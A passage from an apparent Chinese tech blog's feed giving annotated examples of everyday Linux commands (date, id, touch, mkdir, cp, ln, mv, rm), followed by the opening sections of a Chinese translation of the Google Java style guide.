function">date</span> <span class="token parameter variable">-s</span> <span class="token number">20160816</span> <span class="token comment"># 设置成20160816，这样会把具体时间设置成空00:00:00</span><span class="token function">date</span> <span class="token parameter variable">-s</span> 01:01:01 <span class="token comment"># 设置具体时间，不会对日期做更改</span><span class="token function">date</span> <span class="token parameter variable">-s</span> <span class="token string">"01:01:01 2012-05-23"</span> <span class="token comment"># 这样可以设置全部时间 </span><span class="token function">date</span> <span class="token parameter variable">-s</span> <span class="token string">"01:01:01 20120523"</span> <span class="token comment"># 这样可以设置全部时间</span><span class="token function">date</span> <span class="token parameter variable">-s</span> <span class="token string">"2012-05-23 01:01:01"</span> <span class="token comment"># 这样可以设置全部时间 </span><span class="token function">date</span> <span class="token parameter variable">-s</span> <span class="token string">"20120523 01:01:01"</span> <span class="token comment"># 这样可以设置全部时间</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-id-显示用户属性"><a href="#6-id-显示用户属性" class="headerlink" title="6. id - 显示用户属性"></a>6. id - 显示用户属性</h2><p><code>id</code>命令用于打印输出用户<code>uid</code>、<code>gid</code>、用户名和组名等用户身份信息。<code>id</code>命令的语法如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token punctuation">[</span>USERNAME<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常见使用命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 输出当前用户的uid、用户名、gid、组名及用户属于的群组信息</span><span class="token function">id</span><span class="token comment"># 使用 -u 选项，输出用户的 uid</span><span class="token function">id</span> <span class="token parameter variable">-u</span><span class="token comment">#-u 选项和 -n 选项结合使用，输出账户的用户名</span><span class="token function">id</span> <span class="token parameter variable">-un</span><span class="token comment"># 使用 -g 选项，输出帐号当前起作用的gid</span><span class="token function">id</span> <span class="token parameter variable">-g</span><span class="token comment"># -g 与 -n 选项结合使用，输出帐号当前起作用的用户组名</span><span class="token function">id</span> <span class="token parameter variable">-gn</span><span class="token comment"># 使用 -G 选项，输出帐号所属的所有群组id</span><span class="token function">id</span> <span class="token parameter variable">-G</span> root<span class="token comment"># -G 与 -n 选项结合使用，输出账号所属的所有群组的名称</span><span class="token function">id</span> <span class="token parameter variable">-Gn</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用Bash命令整理之操作文件和目录</title>
      <link href="/2018/10/10/ruan-jian-gong-ju/chang-yong-bash-ming-ling-zheng-li-zhi-cao-zuo-wen-jian-he-mu-lu/"/>
      <url>/2018/10/10/ruan-jian-gong-ju/chang-yong-bash-ming-ling-zheng-li-zhi-cao-zuo-wen-jian-he-mu-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-touch-创建文件"><a href="#1-touch-创建文件" class="headerlink" title="1. touch - 创建文件"></a>1. touch - 创建文件</h2><p><code>touch</code>命令就可用于创建、变更和修改文件的时间戳。它是 Linux 操作系统的标准程序。<code>touch</code>命令又如下选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-a: 只改变访问时间 -c: 不创建任何文件-m: 只改变修改时间-r: 使用指定文件的时间替代当前时间-t: 使用 <span class="token punctuation">[</span><span class="token punctuation">[</span>CC<span class="token punctuation">]</span>YY<span class="token punctuation">]</span>MMDDhhmm<span class="token punctuation">[</span>.ss<span class="token punctuation">]</span> 替代当前时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>touch 命令的常见用法如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建一个名为 effyl 的新空文件</span><span class="token function">touch</span> effyl<span class="token comment"># 同时创建名称分别为 effyl myeffyl lueffyl 的三个文件</span><span class="token function">touch</span> effyl myeffyl lueffyl<span class="token comment"># 使用 -a 选项，可以改变或更新文件的最新访问时间，如果文件 effyl 不存在，则新创建一个</span><span class="token function">touch</span> <span class="token parameter variable">-a</span> effyl<span class="token comment"># 使用 -c 选项，可以避免创建一个新文件，并用当前时间更新文件的时间戳</span><span class="token function">touch</span> <span class="token parameter variable">-c</span> effyl<span class="token comment"># 使用 -m 选项，可以只改变文件的修改时间，而访问时间不变</span><span class="token function">touch</span> <span class="token parameter variable">-m</span> effyl<span class="token comment"># 使用 -c 和 -t 选项，来明确设置文件的时间</span><span class="token function">touch</span> <span class="token parameter variable">-c</span> <span class="token parameter variable">-t</span> YYMMDDHHMM filename<span class="token comment"># 如果想使用文件 myeffyl 的时间戳更新文件 effyl 的时间戳，可以使用 -r 选项</span><span class="token function">touch</span> <span class="token parameter variable">-r</span> myeffyl effyl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-mkdir-创建目录"><a href="#2-mkdir-创建目录" class="headerlink" title="2.mkdir - 创建目录"></a>2.mkdir - 创建目录</h2><p><code>mkdir</code>命令用于创建一个新目录。最基本的<code>mkdir</code>命令的使用方法如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在当前目录下创建一个给定的目录名</span><span class="token function">mkdir</span> <span class="token operator">&lt;</span>dirname<span class="token operator">></span><span class="token comment"># 在 backup 中的相对路径创建一个名为 old 的目录</span><span class="token function">mkdir</span> backup/old<span class="token comment"># 在 backup 中的绝对路径中创建一个名为 old 的目录</span><span class="token function">mkdir</span> /home/blinkfox/backup/old<span class="token comment"># 使用 -p 选项，会自动创建所有还不存在的父目录</span><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> backup/old<span class="token comment"># 使用 -m 选项，可以设置将要创建目录的权限</span><span class="token comment"># 如：创建一个任何人都有读写访问权限的目录</span><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token parameter variable">-m</span> <span class="token number">777</span> backup/old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-cp-复制文件或目录"><a href="#3-cp-复制文件或目录" class="headerlink" title="3.cp - 复制文件或目录"></a>3.cp - 复制文件或目录</h2><p><code>cp</code>命令用于将文件从一个地方复制到另一个地方。原来的文件保持不变，新文件可能保持原名或用一个不同的名字。</p><p>使用 cp 命令复制文件和目录的语法有以下几种：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 复制源文件到目标文件</span><span class="token function">cp</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span> SOURCE DEST<span class="token comment"># 复制一个或多个源文件到一个目录</span><span class="token function">cp</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span> SOURCE<span class="token punctuation">..</span>. DIRECTORY<span class="token comment"># 同上</span><span class="token function">cp</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span> <span class="token parameter variable">-t</span> DIRECTORY SOURCE<span class="token punctuation">..</span>. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常用使用示例如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在当前目录下，创建一个文件 file.txt 的副本，取名为 newfile.txt</span><span class="token function">cp</span> file.txt newfile.txt<span class="token comment"># 复制当前目录下的 file.txt 文件到 /tmp 目录下</span><span class="token function">cp</span> file.txt /tmp<span class="token comment"># 复制当前目录下的所有文件到 /tmp 目录下</span><span class="token function">cp</span> * /tmp<span class="token comment"># 使用 -p 选项，可以使复制一个文件到新文件时，保留源文件的所有者、权限等信息</span><span class="token function">cp</span> <span class="token parameter variable">-p</span> filename /path/to/new/location/myfile<span class="token comment"># 使用 -R 或 -r 选项，恶意递归地复制一个目录</span><span class="token comment"># 即将一个目录及其下的所有文件和子目录都复制到另一个目录</span><span class="token function">cp</span> <span class="token parameter variable">-R</span> * /home/blinkfox/backup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-ln-链接文件或目录"><a href="#4-ln-链接文件或目录" class="headerlink" title="4.ln - 链接文件或目录"></a>4.ln - 链接文件或目录</h2><p><code>ln</code>命令用于创建软链接或硬链接。使用 -s 选项，可以创建一个软链接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在目录 lib 下创建一个软链接 library.so，链接到 /home/blinkfox/src/library.so</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/blinkfox/src/library.so /home/blinkfox/lib<span class="token comment"># 创建目录的软链接</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/blinkfox/src <span class="token builtin class-name">source</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-mv-移动文件或目录"><a href="#5-mv-移动文件或目录" class="headerlink" title="5. mv - 移动文件或目录"></a>5. mv - 移动文件或目录</h2><p><code>mv</code>命令用于将文件和目录从一个位置移到另外一个位置。除了移动文件，<code>mv</code>命令还可用于修改文件或目录的名字。</p><p>mv 命令的基本语法如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> SOURCE<span class="token punctuation">..</span>. DIRECTORY<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将当前目录下的文件 source.txt 移到目录 /tmp 下</span><span class="token function">mv</span> source.txt /tmp<span class="token comment"># 将目录 dir1、dir2 移到目录 dir_dist 下</span><span class="token function">mv</span> dir1 dir2 dir_dist<span class="token comment"># 将当前目录下的 old.txt 文件更名为 new.txt</span><span class="token function">mv</span> old.txt new.txt<span class="token comment"># 使用 -i 选项，在重写覆盖目标文件或目录之前给出提示信息</span><span class="token function">mv</span> <span class="token parameter variable">-i</span> old.txt new.txt<span class="token comment"># 将当前目录下的所有文件移动到目录 /tmp 下</span><span class="token function">mv</span> * /tmp/<span class="token comment"># 使用 -i 选项，从 dir1 中移动那些在目标目录中不存在的文件到目标目录</span><span class="token function">mv</span> <span class="token parameter variable">-u</span> dir1/* dir2/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-rm-删除文件或目录"><a href="#6-rm-删除文件或目录" class="headerlink" title="6.rm - 删除文件或目录"></a>6.rm - 删除文件或目录</h2><p><code>rm</code>命令用于删除指定的文件和目录。其语法如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span><span class="token punctuation">..</span>. FILE<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>rm</code>的常用命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除当前目录下的文件 file1.txt、file2.txt、file3.txt</span><span class="token function">rm</span> file1.txt file2.txt file3.txt<span class="token comment"># 删除当前目录下的所有文件</span><span class="token function">rm</span> *<span class="token comment"># 删除你当前帐号主目录下的 temp 目录中的所有文件</span><span class="token function">rm</span> ~/temp/*<span class="token comment"># 使用 -i 选项，可以在删除每个文件或目录前提示用户确认</span><span class="token function">rm</span> <span class="token parameter variable">-i</span> *<span class="token comment"># 删除当前目录下所有以".doc"结尾的文件</span><span class="token function">rm</span> *.doc<span class="token comment"># 删除当前目录下所有文件名中包含"movie"字符串的文件</span><span class="token function">rm</span> *movie*<span class="token comment"># 删除当前目录下所有以"a"开头的文件</span><span class="token function">rm</span> a*<span class="token comment"># 删除当前目录下整个文件名（包括扩展名）只有 3 个字符的所有文件</span><span class="token function">rm</span> ???<span class="token comment"># 删除当前目录下文件扩展名有两个字符的所有文件</span><span class="token function">rm</span> *.??<span class="token comment"># 删除当前目录下文件名中含有字母 a 或 b 或 c 的所有文件</span><span class="token function">rm</span> *<span class="token punctuation">[</span>abc<span class="token punctuation">]</span>*<span class="token comment"># 删除当前目录下文件名中包含 0~9 的所有文件</span><span class="token function">rm</span> *<span class="token punctuation">[</span><span class="token number">0</span>-9<span class="token punctuation">]</span>*<span class="token comment"># 删除当前目录下文件扩展名是字母 c 或 h 的所有文件</span><span class="token function">rm</span> *.<span class="token punctuation">[</span>ch<span class="token punctuation">]</span><span class="token comment"># 删除 /tmp 目录下的所有文件及其子目录</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>-f 删除前不提示用户确认，并忽略不存在的文件</p></blockquote><blockquote><p>-r 递归地删除目录及其下的内容</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 软件工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Java编程风格指南</title>
      <link href="/2018/10/05/bian-cheng/google-java-bian-cheng-feng-ge-zhi-nan/"/>
      <url>/2018/10/05/bian-cheng/google-java-bian-cheng-feng-ge-zhi-nan/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>这份文档是<code>Google Java</code>编程风格规范的完整定义。当且仅当一个<code>Java</code>源文件符合此文档中的规则，我们才认为它符合<code>Google</code>的<code>Java</code>编程风格。</p><p>与其它的编程风格指南一样，这里所讨论的不仅仅是编码格式美不美观的问题，同时也讨论一些约定及编码标准。然而，这份文档主要侧重于我们所普遍遵循的规则，对于那些不是明确强制要求的，我们尽量避免提供意见。</p><h3 id="1-1-术语说明"><a href="#1-1-术语说明" class="headerlink" title="1.1 术语说明"></a>1.1 术语说明</h3><p>本文档中除非特殊说明，否则：</p><ul><li>术语<code>class</code>可表示一个普通类、枚举类、接口或者注解。</li><li>术语<code>comment</code>只用来指代实现的注释(<code>implementation comments</code>)，我们不使用文档注释(<code>documentation comments</code>)一词，而是用<code>Javadoc</code>。</li></ul><p>其他术语说明，将在文档中需要说明的地方单独说明。</p><h3 id="1-2-指南说明"><a href="#1-2-指南说明" class="headerlink" title="1.2 指南说明"></a>1.2 指南说明</h3><p>本文档中的示例代码并不作为规范。也就是说，虽然示例代码是遵循Google编程风格，但并不意味着这是展现这些代码的唯一方式。示例中的格式选择不应该被强制定为规则。</p><h2 id="2-源文件基础"><a href="#2-源文件基础" class="headerlink" title="2 源文件基础"></a>2 源文件基础</h2><h3 id="2-1-文件名"><a href="#2-1-文件名" class="headerlink" title="2.1 文件名"></a>2.1 文件名</h3><p>源文件以其最顶层的类名（其中只有一个）来命名，大小写敏感，文件扩展名为<code>.java</code>。</p><h3 id="2-2-文件编码：UTF-8"><a href="#2-2-文件编码：UTF-8" class="headerlink" title="2.2 文件编码：UTF-8"></a>2.2 文件编码：UTF-8</h3><p>源文件编码格式使用<code>UTF-8</code>。</p><h3 id="2-3-特殊字符"><a href="#2-3-特殊字符" class="headerlink" title="2.3 特殊字符"></a>2.3 特殊字符</h3><h4 id="2-3-1-空格字符"><a href="#2-3-1-空格字符" class="headerlink" title="2.3.1 空格字符"></a>2.3.1 空格字符</h4><p>除了换行符外，<code>ASCII</code>水平空白字符（0x20）是源码文件中唯一支持的空格字符。这意味着：</p><ul><li>所有其他空白字符将被转义。</li><li><code>Tab</code>字符不被用作缩进控制。</li></ul><h4 id="2-3-2-特殊转义字符串"><a href="#2-3-2-特殊转义字符串" class="headerlink" title="2.3.2 特殊转义字符串"></a>2.3.2 特殊转义字符串</h4><p>任何需要转义字符串表示的字符（例如：<code>\b</code>, <code>\t</code>, <code>\n</code>, <code>\f</code>, <code>\r</code>, <code>\&#39;</code>, <code>\\</code>等），采用这种转义字符串的方式表示，而不采用对应字符的八进制数（例如 <code>\012</code>）或<code>Unicode</code>码（例如：<code>\u000a</code>）表示。</p><h4 id="2-3-3-非ASCII字符"><a href="#2-3-3-非ASCII字符" class="headerlink" title="2.3.3 非ASCII字符"></a>2.3.3 非ASCII字符</h4><p>对于其余非<code>ASCII</code>字符，直接使用<code>Unicode</code>字符（例如 <code>∞</code>），或者使用对应的<code>Unicode</code>码（例如：<code>\u221e</code>）转义，都是允许的。<strong>唯一需要考虑的是，何种方式更能使代码容易阅读和理解</strong>。</p><blockquote><p><strong>注意</strong>：在使用<code>Unicode</code>码转义，或者甚至是有时直接使用<code>Unicode</code>字符的时候，建议多添加一些注释说明，将对别人读懂代码很有帮助。</p></blockquote><p>例子：</p><table><thead><tr><th>示例</th><th>结论</th></tr></thead><tbody><tr><td>String unitAbbrev = “μs”;</td><td>赞：即使没有注释也非常清晰。</td></tr><tr><td>String unitAbbrev = “\u03bcs”; // “μs”</td><td>允许，但没有理由要这样做。</td></tr><tr><td>String unitAbbrev = “\u03bcs”; // Greek letter mu, “s”</td><td>允许，但这样做显得笨拙还容易出错。</td></tr><tr><td>String unitAbbrev = “\u03bcs”;</td><td>很糟：读者根本看不出这是什么。</td></tr><tr><td>return ‘\ufeff’ + content; // byte order mark</td><td>很好：对于非打印字符，使用转义，并在必要时写上注释。</td></tr></tbody></table><blockquote><p><strong>注意</strong>：永远不要由于害怕某些程序可能无法正确处理非<code>ASCII</code>字符而让你的代码可读性变差。当程序无法正确处理非<code>ASCII</code>字符时，它自然无法正确运行，你就会去<code>fix</code>这些问题的了。(言下之意就是大胆去用非<code>ASCII</code>字符，如果真的有需要的话)</p></blockquote><h2 id="3-源文件结构"><a href="#3-源文件结构" class="headerlink" title="3 源文件结构"></a>3 源文件结构</h2><p>源文件按照先后顺序，由以下几部分组成：</p><ul><li>许可证(<code>License</code>)或版权信息(<code>copyright</code>)（如果需要）</li><li><code>package</code>语句</li><li><code>import</code>语句</li><li><code>class</code>类声明（每个源码文件只能有唯一一个顶级<code>class</code>）。</li></ul><blockquote><p><strong>注意</strong>：以上每个部分之间应该只有<strong>一个空行</strong>作为间隔。</p></blockquote><h3 id="3-1-许可证或版权信息"><a href="#3-1-许可证或版权信息" class="headerlink" title="3.1 许可证或版权信息"></a>3.1 许可证或版权信息</h3><p>如果一个文件包含许可证或版权信息，那么它应当被放在文件最前面。</p><h3 id="3-2-package语句"><a href="#3-2-package语句" class="headerlink" title="3.2 package语句"></a>3.2 package语句</h3><p><code>package</code>语句不换行，单行长度限制(4.4节)不适用于package语句。(即package语句写在一行里)</p><h3 id="3-3-import语句"><a href="#3-3-import语句" class="headerlink" title="3.3 import语句"></a>3.3 import语句</h3><h4 id="3-3-1-import不使用通配符"><a href="#3-3-1-import不使用通配符" class="headerlink" title="3.3.1 import不使用通配符"></a>3.3.1 import不使用通配符</h4><p><code>import</code>语句中不应该使用通配符，不管是否是静态导入。</p><h4 id="3-3-2-import不换行"><a href="#3-3-2-import不换行" class="headerlink" title="3.3.2 import不换行"></a>3.3.2 import不换行</h4><p><code>import</code>语句不换行，列限制(4.4节)并不适用于<code>import</code>语句。(每个<code>import</code>语句独立成行)</p><h4 id="3-3-3-顺序和间距"><a href="#3-3-3-顺序和间距" class="headerlink" title="3.3.3 顺序和间距"></a>3.3.3 顺序和间距</h4><p><code>import</code>语句可分为以下几组，按照顺序，每组由<strong>一个空行</strong>分隔：</p><ul><li>所有的静态导入(static import)归为一组</li><li><code>com.google</code>包的<code>import</code>归为一组</li><li>使用的第三方包的导入，每个顶级按字典顺序归为一组。例如：<code>android</code>, <code>com</code>, <code>junit</code>, <code>org</code>, <code>sun</code></li><li><code>java</code>包归为一组</li><li><code>javax</code>包归为一组</li></ul><blockquote><p><strong>注意</strong>：同一组内的<code>import</code>语句之间不应用空行隔开，同一组中的<code>import</code>语句按字典序排列。</p></blockquote><h3 id="3-4-类声明"><a href="#3-4-类声明" class="headerlink" title="3.4 类声明"></a>3.4 类声明</h3><h4 id="3-4-1-只声明唯一一个顶级class"><a href="#3-4-1-只声明唯一一个顶级class" class="headerlink" title="3.4.1 只声明唯一一个顶级class"></a>3.4.1 只声明唯一一个顶级class</h4><p>每个源文件中只能有一个顶级class。</p><h4 id="3-4-2-类成员顺序"><a href="#3-4-2-类成员顺序" class="headerlink" title="3.4.2 类成员顺序"></a>3.4.2 类成员顺序</h4><p>类成员的顺序对代码的易读性有很大影响，但是没有一个统一正确的标准。不同的类可能有不同的排序方式。</p><p>最重要的一点，<strong>每个类应该以某种逻辑去排序它的成员，维护者应该要能解释这种排序逻辑</strong>。比如，新的方法不能总是习惯性地添加到类的结尾，因为这样就是按时间顺序而非某种逻辑来排序的。</p><h5 id="3-4-2-1-重载：永不分离"><a href="#3-4-2-1-重载：永不分离" class="headerlink" title="3.4.2.1 重载：永不分离"></a>3.4.2.1 重载：永不分离</h5><p>当一个类有多个构造函数，或是多个同名方法，这些方法应该按顺序出现在一起，中间不要放进其它方法。</p><h2 id="4-格式"><a href="#4-格式" class="headerlink" title="4 格式"></a>4 格式</h2><blockquote><p><strong>术语说明</strong>：块状结构(<code>block-­like construct</code>)指的是一个类，方法或构造函数的主体。需要注意的是，数组初始化中的初始值可被选择性地视为块状结构(4.8.3.1节)。</p></blockquote><h3 id="4-1-大括号"><a href="#4-1-大括号" class="headerlink" title="4.1 大括号"></a>4.1 大括号</h3><h4 id="4-1-1-使用大括号-即使是可选的"><a href="#4-1-1-使用大括号-即使是可选的" class="headerlink" title="4.1.1 使用大括号(即使是可选的)"></a>4.1.1 使用大括号(即使是可选的)</h4><p>大括号一般用在<code>if</code>, <code>else</code>, <code>for</code>, <code>do</code>, <code>while</code>等语句，即使只有一条语句(或是空)，也应该把大括号写上。</p><h4 id="4-1-2-非空语句块采用K-amp-R风格"><a href="#4-1-2-非空语句块采用K-amp-R风格" class="headerlink" title="4.1.2 非空语句块采用K&amp;R风格"></a>4.1.2 非空语句块采用<code>K&amp;R</code>风格</h4><p>对于非空语句块，大括号遵循<code>Kernighan</code>和<code>Ritchie</code>风格 (<a href="https://blog.codinghorror.com/new-programming-jargon/">Egyptian brackets</a>):</p><ul><li>左大括号前不换行</li><li>左大括号后换行</li><li>右大括号前换行</li><li>如果右大括号结束是一个<code>语句块</code>或者<code>方法体</code>、<code>构造函数体</code>或者<code>有命名的类体</code>，则需要换行。当右括号后面接<code>else</code>或者<code>逗号</code>时，不应该换行。</li></ul><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">condition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">condition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">something</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ProblemException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">recover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">otherCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">somethingElse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">lastThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一些例外的情况，将在<code>4.8.1</code>节讲<code>枚举类型</code>的时候讲到。</p><h4 id="4-1-3-空语句块：使代码更简洁"><a href="#4-1-3-空语句块：使代码更简洁" class="headerlink" title="4.1.3 空语句块：使代码更简洁"></a>4.1.3 空语句块：使代码更简洁</h4><p>一个空的语句块，可以在左大括号之后直接接右大括号，中间不需要空格或换行。但是当一个由几个语句块联合组成的语句块时，则需要换行。（例如：<code>if/else</code> 或者<code>try/catch/finally</code>）.</p><p>示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 这是可接受的</span><span class="token keyword">void</span> <span class="token function">doNothing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 这同样是可接受的</span><span class="token keyword">void</span> <span class="token function">doNothingElse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 这是不可接受的：多块语句中没有简洁的空语句块</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2块缩进：2个空格"><a href="#4-2块缩进：2个空格" class="headerlink" title="4.2块缩进：2个空格"></a>4.2块缩进：2个空格</h3><p>每当一个新的语句块产生，缩进就增加两个空格。当这个语句块结束时，缩进恢复到上一层级的缩进格数。缩进要求对整个语句块中的代码和注释都适用。（例子可参考之前4.1.2节中的例子）。</p><blockquote><p><strong>注意</strong>：根据实际的编程经验，<code>2</code>个空格缩进的代码在当前大屏的计算机上会显得十分拥挤，反而使得代码<code>臃肿</code>不够美观。所以，我这里建议使用<code>4</code>个空格来缩进，会使得更加美观，而且能侧面督促开发人员减少代码的嵌套层数。</p></blockquote><h3 id="4-3-一行一个语句"><a href="#4-3-一行一个语句" class="headerlink" title="4.3 一行一个语句"></a>4.3 一行一个语句</h3><p>每条语句结束都需要换行。</p><h3 id="4-4-列长度限制：100"><a href="#4-4-列长度限制：100" class="headerlink" title="4.4 列长度限制：100"></a>4.4 列长度限制：100</h3><p>Java代码的列长度限制为<code>100个</code>字符。 除了如下所述，任何超过此限制的行都必须跳行。这在4.5节会有详细解释。</p><p>例外：</p><ul><li>不可能满足行长度限制的行(例如，Javadoc中的一个长URL，或是一个长的JSNI方法参考)</li><li><code>package</code>和<code>import</code>语句(见3.2节和3.3节)</li><li>注释中那些可能被剪切并粘贴到shell中的命令行</li></ul><blockquote><p><strong>注意</strong>：当前的计算机屏幕都已经比很宽了，而且变量及方法命名都较长，<code>100</code>个字符的长度反而会出现很多不必要的跳行，已经不适应当今的情况了，根据实际编程经验，我这里建议使用<code>120</code>个字符的宽度更为合适。</p></blockquote><h3 id="4-5-换行"><a href="#4-5-换行" class="headerlink" title="4.5 换行"></a>4.5 